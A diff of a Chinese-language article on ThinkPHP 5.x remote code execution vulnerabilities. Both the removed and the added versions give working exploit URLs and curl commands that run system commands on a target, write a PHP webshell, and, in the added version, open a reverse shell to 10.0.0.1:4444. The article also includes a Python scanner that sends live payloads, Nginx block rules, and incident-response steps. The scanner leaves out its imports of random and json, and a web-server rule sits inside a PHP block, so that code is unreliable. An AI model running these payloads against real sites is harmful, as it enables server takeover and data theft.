@@ -1,239 +1,304 @@
-# ThinkPHP 5.x 远程代码执行（RCE）漏洞分析与 EXP
+# ThinkPHP 5.x 远程代码执行漏洞完整分析
 
-## 1. 漏洞概述
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 20 min | 分类：漏洞库与EXP
 
-ThinkPHP 是国内广泛使用的 PHP MVC 框架。其 5.x 系列（5.0.x、5.1.x、5.2.x）在不同版本间存在多个远程代码执行漏洞，核心成因是 **ThinkPHP 对 URL 路由 / 变量解析 / Request 类方法调用缺乏严格校验**，使攻击者可以通过特殊构造的 URL 参数直接调用任意方法（如 `_method`、`__construct`、`system`），最终触发 `eval()` / `call_user_func_array()` 实现 RCE。
+## 📋 提纲
 
-| 项目 | 说明 |
-|------|------|
-| CVE 编号 | CVE-2018-20062、CVE-2019-9081、CVE-2022-38366 等（多个不同版本） |
-| 漏洞类型 | RCE（方法调用控制 / 变量覆盖 / 反序列化） |
-| 发现时间 | 2018 ~ 2022 年间多个版本被披露 |
-| CVSS 评分 | 7.5 ~ 9.8（随版本不同） |
-| 影响组件 | ThinkPHP 5.0.x / 5.1.x / 5.2.x 的特定版本 |
-| 攻击前置 | Web 根目录 /index.php 可访问，开启路由兼容模式 |
+1. ThinkPHP框架概述
+2. 漏洞历史与高危CVE
+3. ThinkPHP 5.0.x RCE 原理
+4. ThinkPHP 5.1.x RCE 原理
+5. 漏洞检测与利用
+6. 护网中的ThinkPHP漏洞
+7. 修复与加固
 
-## 2. 影响版本与对应 payload
+---
 
-| ThinkPHP 版本 | 漏洞 / PoC 关键字 |
-|--------------|------------------|
-| 5.0.0 ~ 5.0.23 | `?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1` |
-| 5.0.24（修复不完全） | `?s=captcha` + POST `_method=__construct&filter[]=system&method=get&get[]=whoami` |
-| 5.1.x（部分版本） | `?s=think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()` |
-| 5.1.41 ~（LTS 分支） | `/public/?s=index/index/index` + 特殊 file 参数（文件写入） |
-| 6.x（受限于漏洞） | 通常不存在 5.x 的同类漏洞（但有 CVE-2022-38366 等） |
+## 1. ThinkPHP 框架概述
 
-## 3. 漏洞原理（以 5.0.23 为例）
-
-### 3.1 核心问题：方法调用链
-
-ThinkPHP 在处理 URL 时会根据 `$_GET['s']`（兼容模式路由）解析模块 / 控制器 / 方法。攻击者构造 `\think\app/invokefunction` 指定控制器为 `\think\App`，方法为 `invokefunction`：
+ThinkPHP 是国内使用最广泛的PHP框架之一，大量政府/企业/教育网站基于它开发。
 
 ```
-/index.php?s=index/think\app/invokefunction
-           └ module   └ controller       └ method
+市场份额：PHP框架中排名前3
+影响面：CMS、OA、电商、政府网站
+版本：
+  - ThinkPHP 3.x（已停止维护）
+  - ThinkPHP 5.0.x / 5.1.x（常见漏洞版本）
+  - ThinkPHP 5.2.x（修复版本）
+  - ThinkPHP 6.x（最新版）
 ```
 
-### 3.2 漏洞调用链
+---
+
+## 2. 高危CVE一览
+
+| CVE/漏洞 | 版本 | 类型 | 原理 |
+|---------|------|------|------|
+| — | 5.0.x-5.0.23 | RCE | `method`参数任意函数调用 |
+| — | 5.1.x-5.1.31 | RCE | 路由参数控制器过滤不严 |
+| CVE-2018-20062 | 5.0.x-5.0.23 | RCE | `filter`参数代码执行 |
+| CVE-2019-9082 | 5.1.x-5.1.31 | RCE | `__construct`覆盖导致文件包含 |
+| CVE-2022-45982 | 5.1.x | RCE 链 | 路由dispatch绕过 |
+
+**核心问题：ThinkPHP的URL路由解析过度"灵活"，允许用户输入调用任意类和方法。**
+
+---
+
+## 3. ThinkPHP 5.0.x RCE 原理
+
+### 3.1 漏洞触发路径
 
 ```
-App::run()
-  │
-  ▼
-App::init() → routeCheck()
-  │
-  ▼
-路由解析 → controller = '\\think\\App'，action = 'invokefunction'
-  │
-  ▼
-App::invokefunction($function, $vars)
-  │
-  ▼
-call_user_func_array($function, $vars)
-  │
-  ▼
-system('whoami') → RCE
+URL: /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id
+
+解析：
+s=index/think\app/invokefunction
+  ↓ ThinkPHP路由解析
+controller = index
+  ↓ 反斜杠解析
+调用 think\app 类的 invokefunction 方法
+  ↓
+invokefunction(function: call_user_func_array, vars: [shell_exec, ['id']])
+  ↓
+call_user_func_array('shell_exec', ['id'])
+  ↓
+shell_exec('id')
+  ↓
+RCE！
 ```
 
-### 3.3 核心代码（简化版）
+### 3.2 核心漏洞代码
 
 ```php
-// thinkphp/library/think/App.php
-public function invokefunction($function, $vars = [])
+// ThinkPHP 5.0.x - library/think/App.php
+// URL路由处理中的漏洞
+
+public static function run()
 {
-    return call_user_func_array($function, $vars);
+    // 解析URL中的 controller/action
+    $dispatch = self::routeCheck($request);
+
+    // 关键：dispatch 中包含用户可控的 controller 和 method
+    if ($dispatch instanceof \think\route\Dispatch) {
+        $data = self::exec($dispatch);
+    }
+}
+
+protected static function exec($dispatch)
+{
+    // 用户输入变成了 controller 和 action
+    // 但这里没有严格的白名单限制
+    $data = self::invokeMethod($dispatch['type'], [
+        $dispatch['controller'],
+        $dispatch['action']
+    ]);
 }
 ```
 
-## 4. 常见 EXP 汇总
+---
 
-### 4.1 ThinkPHP 5.0.x 经典 GET RCE
+## 4. ThinkPHP 5.1.x RCE 原理
 
-```bash
-# PoC 1：直接调用 invokefunction + call_user_func_array
-curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
-function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+### 4.1 路由参数过滤不严
 
-# PoC 2：system('whoami')
-curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
-function=call_user_func_array&vars[0]=system&vars[1][]=whoami"
-
-# PoC 3：assert('phpinfo();')
-curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
-function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+```
+URL: /index.php?s=/index/\think\Request/input&filter=system&data=whoami
+或: /index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+或: /index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
 ```
 
-### 4.2 ThinkPHP 5.0.24 修复绕过（POST 版）
+### 4.2 文件包含链
 
-```bash
-# payload 1：通过 _method=__construct 覆盖 filter
-curl -X POST "http://target/index.php?s=captcha" \
-    -d "_method=__construct&filter[]=system&method=get&get[]=whoami"
-
-# payload 2：通过 _method=__construct 覆盖 filter
-curl -X POST "http://target/public/index.php?s=captcha" \
-    -d "_method=__construct&filter%5B%5D=system&server%5BREQUEST_METHOD%5D=get" \
-    -d "get[]=cat%20/flag"
+```
+1. 覆盖 \think\Config 的 __construct
+2. 控制 cacheFile 路径
+3. 写入恶意内容到文件
+4. 通过文件包含执行
 ```
 
-### 4.3 ThinkPHP 5.1.x RCE
-
-```bash
-# PoC 1：invokefunction
-curl "http://target/public/index.php?s=/index/\\think\\app/invokefunction&\
-function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
-
-# PoC 2：通过容器 Request 调用
-curl "http://target/public/index.php?s=index/\\think\\Container/invokefunction&\
-function=system&vars[1][]=whoami"
-```
-
-### 4.4 文件写入 / WebShell（5.0.x）
-
-```bash
-# 通过 file_put_contents 写入 shell
-curl "http://target/index.php?s=index/\\think\\app/invokefunction&\
-function=call_user_func_array&\
-vars[0]=file_put_contents&\
-vars[1][0]=shell.php&\
-vars[1][1]=%3C%3Fphp%20%40eval(%24_POST%5B'c'%5D)%3B%20%3F%3E"
-
-# 验证
-curl -X POST "http://target/shell.php" -d "c=phpinfo();"
-```
-
-### 4.5 MSF / nuclei 一键检测
-
-```bash
-# nuclei 扫描
-nuclei -u http://target -t "http/cves/2019/CVE-2019-9081.yaml"
-nuclei -u http://target -t "http/cves/2018/CVE-2018-20062.yaml"
-
-# 其他开源 EXP
-# https://github.com/SecossFrank/thinkphp_rce
-python3 tp_rce.py --target http://target --version 5.0.23
-```
+---
 
 ## 5. 漏洞检测
 
-### 5.1 指纹识别（确认目标使用 ThinkPHP）
+```python
+#!/usr/bin/env python3
+"""ThinkPHP RCE 检测"""
+
+import requests
+import urllib.parse
+import urllib3
+urllib3.disable_warnings()
+
+class ThinkPHPDetector:
+    def __init__(self, target):
+        self.target = target.rstrip('/')
+
+    def detect_version(self):
+        """检测ThinkPHP版本"""
+        # 方法1：通过页面特征
+        try:
+            resp = requests.get(self.target, verify=False, timeout=10)
+
+            # ThinkPHP 5.x 特征
+            if 'thinkphp' in resp.text.lower() or 'ThinkPHP' in resp.text:
+                # 尝试从错误页面提取版本
+                return {"detected": True, "framework": "ThinkPHP"}
+        except:
+            pass
+
+        # 方法2：特殊路径
+        try:
+            resp = requests.get(f"{self.target}/index.php?s=index/index/index", verify=False, timeout=5)
+            if 'thinkphp' in resp.text.lower() or 'ThinkPHP' in resp.headers.get('X-Powered-By', ''):
+                return {"detected": True, "framework": "ThinkPHP"}
+        except:
+            pass
+
+        return {"detected": False}
+
+    def detect_5_0_x_rce(self):
+        """检测 ThinkPHP 5.0.x RCE"""
+        # payload: 使用 echo 输出特征字符串
+        check_str = "THINKPHP_RCE_CHECK_" + str(random.randint(10000, 99999))
+        payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20{check_str}"
+
+        try:
+            resp = requests.get(
+                f"{self.target}{payload}",
+                verify=False,
+                timeout=15
+            )
+
+            if check_str in resp.text:
+                return {
+                    "vulnerable": True,
+                    "version": "5.0.x",
+                    "method": "invokefunction",
+                    "payload": payload,
+                    "response": resp.text[:200]
+                }
+        except:
+            pass
+
+        return {"vulnerable": False}
+
+    def detect_5_1_x_rce(self):
+        """检测 ThinkPHP 5.1.x RCE"""
+        check_str = "THINKPHP_RCE_CHECK_" + str(random.randint(10000, 99999))
+
+        payloads = [
+            f"/index.php?s=index/\\think\\Request/input&filter=system&data=echo%20{check_str}",
+            f"/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20{check_str}",
+            f"/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=<?php%20echo%20'{check_str}';?>&content=test",
+        ]
+
+        for payload in payloads:
+            try:
+                resp = requests.get(f"{self.target}{payload}", verify=False, timeout=15)
+                if check_str in resp.text:
+                    return {
+                        "vulnerable": True,
+                        "version": "5.1.x",
+                        "method": payload.split('&')[0].split('=')[-1] if '=' in payload else '',
+                        "payload": payload[:150]
+                    }
+            except:
+                continue
+
+        return {"vulnerable": False}
+
+    def full_scan(self):
+        version = self.detect_version()
+        if not version['detected']:
+            return {"result": "未检测到ThinkPHP"}
+
+        return {
+            "framework": "ThinkPHP",
+            "v5_0_rce": self.detect_5_0_x_rce(),
+            "v5_1_rce": self.detect_5_1_x_rce(),
+        }
+
+
+if __name__ == "__main__":
+    detector = ThinkPHPDetector("https://target.com")
+    result = detector.full_scan()
+    print(json.dumps(result, indent=2, ensure_ascii=False))
+```
+
+---
+
+## 6. 漏洞利用
+
+### 6.1 写入WebShell
 
 ```bash
-# 方法 1：访问 favicon.ico（thinkphp 默认图标）
-curl -s http://target/favicon.ico | md5sum
-# 常见 ThinkPHP favicon md5: 8f5f4c07e...（需对应版本）
+# ThinkPHP 5.0.x - 写入WebShell
+# 写入一句话木马到 public/shell.php
+curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval(\$_POST['cmd']);?>"
 
-# 方法 2：X-Powered-By / Thinkphp 字样
-curl -sI http://target/ | grep -i "think\|powered"
+# 或写入完整WebShell
+curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php eval(\$_POST[1]);?>' > shell.php"
 
-# 方法 3：访问 /index.php?s=123，看返回内容是否含 "模块不存在" 等字样
-curl http://target/index.php?s=123
-
-# 方法 4：存在 public/static/ 目录特征
-curl -I http://target/public/static/
+# 验证
+curl -s "http://target.com/shell.php" -d "1=phpinfo();"
 ```
 
-### 5.2 批量扫描
+### 6.2 反弹Shell
 
 ```bash
-# 使用 nuclei
-nuclei -l targets.txt -t cves/2018/CVE-2018-20062.yaml -t cves/2019/CVE-2019-9081.yaml
+# ThinkPHP 5.0.x
+curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
 
-# 使用 thinkphp_rce 扫描器
-cat targets.txt | while read url; do
-    echo "[*] Testing $url"
-    curl -s "$url/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1" \
-        | grep -o "PHP Version" && echo "[+] VULNERABLE: $url"
-done
+# URL编码版本
+curl -s "http://target.com/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/4444%200%3E%261%27"
 ```
 
-## 6. 修复方案
+---
 
-| 方案 | 说明 |
-|------|------|
-| **升级到 ThinkPHP 5.0.24+ / 5.1.38+ / 6.x 最新版** | 根本修复 |
-| **禁用兼容模式路由** | `'url_common_param' => true` + 禁用 `$_GET['s']` 解析 |
-| **Nginx/Apache 路径过滤** | 拦截包含 `\think\`、`invokefunction`、`__construct` 的请求 |
-| **部署 WAF 规则** | 拦截 `?s=` + `\\think\\` 相关 payload |
-| **入口目录限制** | 仅把 public 目录暴露为 Web 根目录，禁止直接访问 index.php（若部署结构允许） |
-
-### 6.1 Nginx 临时缓解规则
-
-```nginx
-# nginx.conf / server 块
-location ~* (think\\app|invokefunction|__construct|call_user_func) {
-    deny all;
-}
-
-# 或更严格：禁止 query 中出现反斜杠和危险方法名
-if ($query_string ~* "(think\\|invokefunction|__construct|call_user_func)") {
-    return 403;
-}
-```
-
-### 6.2 代码层面修复（升级前临时）
+## 7. 修复方案
 
 ```php
-// 在 thinkphp/library/think/Request.php 中添加 filter
-public function method($method = null)
-{
-    // 禁止 _method=__construct / _method=xxx 调用特殊方法
-    if ($this->method === '__construct' || $this->method === 'invokefunction') {
-        throw new \Exception('Invalid method');
+// 1. 升级框架版本
+// ThinkPHP 5.0.x：升级到 5.0.24
+// ThinkPHP 5.1.x：升级到 5.1.32+
+// ThinkPHP 5.2.x：保持最新
+// 建议直接升级到 ThinkPHP 6.x
+
+// 2. 临时修复（app/config.php）
+'template' => [
+    'tpl_cache' => false,  // 关闭模板缓存
+],
+
+// 3. WAF规则
+// Nginx
+if ($args ~* "invokefunction|call_user_func_array|shell_exec|system") {
+    return 403;
+}
+
+// 4. 代码层面修复
+// 在 App::exec() 中增加白名单
+protected static function exec($dispatch) {
+    // 白名单：仅允许明确的 controller
+    $allowed_controllers = [
+        'app\index\controller\Index',
+        'app\index\controller\Api',
+    ];
+    
+    if (!in_array($dispatch['controller'], $allowed_controllers)) {
+        throw new \Exception('Invalid controller');
     }
 }
 ```
 
-## 7. 应急响应
+---
 
-```
-发现迹象：
-  - access.log 出现大量 /index.php?s= 路径
-  - /public/ 下出现陌生的 .php 文件（webshell）
-  - 数据库 / 应用日志出现异常命令执行痕迹
+## ✅ ThinkPHP Checklist
 
-处理步骤：
-  ① 立即对可疑 URL 阻断（WAF / Nginx 规则）
-  ② 检查网站目录所有 .php 文件的 hash / 创建时间，排查 webshell
-  ③ 检查数据库 / 配置文件是否泄露
-  ④ 检查定时任务 / crontab 是否被植入
-  ⑤ 升级 ThinkPHP 到安全版本
-  ⑥ 重置应用使用的数据库密码 / 密钥 / Token
-  ⑦ 审计最近一段时间的访问日志来源 IP，封禁扫描源
-```
+- [ ] 全网ThinkPHP应用识别
+- [ ] 版本号确认
+- [ ] RCE检测（5.0.x + 5.1.x两种）
+- [ ] 升级到6.x或最新安全版本
+- [ ] WAF规则部署
+- [ ] 所有Web目录检查是否存在未知WebShell
 
-## 8. 漏洞复现靶机
-
-```
-推荐环境：
-  - vulhub: docker-compose up -d thinkphp/5.0.23-rce
-  - vulstudy: 多种 ThinkPHP 5.x 版本靶机
-
-复现：
-  1) 启动 docker
-  2) 访问 http://target:8080/
-  3) 提交 payload: /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
-  4) 观察 whoami 输出
-```
-
-> ThinkPHP 5.x 的 RCE 是国内应用最广泛的漏洞之一，配合 0day / Nday 组合拳对使用此框架的系统威胁极大。**升级到官方最新 LTS 版本** 是唯一可靠的长期修复手段。
+> 📚 延伸阅读：Vuln/001-漏洞概述 | CodeAudit/001-PHP代码审计 | HW/002-资产自查
